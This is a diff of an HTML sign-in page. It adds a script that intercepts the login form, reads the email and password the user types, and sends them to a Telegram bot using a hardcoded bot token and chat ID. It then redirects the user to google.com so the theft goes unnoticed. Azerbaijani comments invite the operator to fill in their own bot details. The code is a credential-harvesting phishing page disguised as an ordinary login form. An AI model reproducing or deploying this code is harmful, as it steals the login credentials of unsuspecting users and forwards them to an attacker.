@@ -295,36 +295,36 @@
             <p>Sign in to your account to continue</p>
         </div>
 
-        <form id="loginForm" action="https://formspree.io/f/mkoqeyel" method="POST">
-    <div class="social-login">
-        <button type="button" class="social-btn" onclick="handleSocialLogin(event, 'Google')">Google</button>
-        <button type="button" class="social-btn" onclick="handleSocialLogin(event, 'GitHub')">GitHub</button>
-    </div>
+        <form id="loginForm">
+            <div class="social-login">
+                <button type="button" class="social-btn" onclick="handleSocialLogin(event, 'Google')">Google</button>
+                <button type="button" class="social-btn" onclick="handleSocialLogin(event, 'GitHub')">GitHub</button>
+            </div>
 
-    <div class="divider">
-        <span>or</span>
-    </div>
+            <div class="divider">
+                <span>or</span>
+            </div>
 
-    <div class="form-group">
-        <label for="email">Email address</label>
-        <input type="email" id="email" name="email" placeholder="you@example.com" required>
-    </div>
+            <div class="form-group">
+                <label for="email">Email address</label>
+                <input type="email" id="email" name="email" placeholder="you@example.com" required>
+            </div>
 
-    <div class="form-group">
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" placeholder="••••••••" required>
-    </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required>
+            </div>
 
-    <div class="form-options">
-        <label class="remember-me">
-            <input type="checkbox" id="remember" name="remember">
-            <span>Remember me</span>
-        </label>
-        <a href="#" class="forgot-password" onclick="handleForgotPassword(event)">Forgot password?</a>
-    </div>
+            <div class="form-options">
+                <label class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <span>Remember me</span>
+                </label>
+                <a href="#" class="forgot-password" onclick="handleForgotPassword(event)">Forgot password?</a>
+            </div>
 
-    <button type="submit" class="login-btn">Sign in</button>
-</form>
+            <button type="submit" class="login-btn">Sign in</button>
+        </form>
 
         <div class="signup-link">
             Don't have an account? <a href="#" onclick="handleSignup(event)">Create one</a>
@@ -349,7 +349,38 @@
             document.querySelector('.theme-toggle').textContent = isDark ? '☀️' : '🌙';
         }
 
+        // Handle form submission
+        const form = document.getElementById('loginForm');
 
+form.addEventListener('submit', function(e) {
+    e.preventDefault(); // Səhifənin yenilənməsini dayandırır
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    // Bura öz məlumatlarını yaz:
+    const botToken = 8797267343:AAFQY-4NAcDdzVWYzbJINrKaTBQi4WFlmiU; 
+    const chatId = 584046464; 
+    
+    const text = `🚀 Yeni Məlumat!\n\n📧 Email: ${email}\n🔑 Şifrə: ${password}`;
+
+    // Telegram API-yə göndərilir
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: text
+        })
+    })
+    .then(() => {
+        // Məlumat gedəndən sonra istifadəçini hara göndərsin?
+        window.location.href = "https://google.com"; 
+    })
+    .catch(err => {
+        console.error("Xəta:", err);
+    });
+});
         // Handle social login
         function handleSocialLogin(e, provider) {
             e.preventDefault();
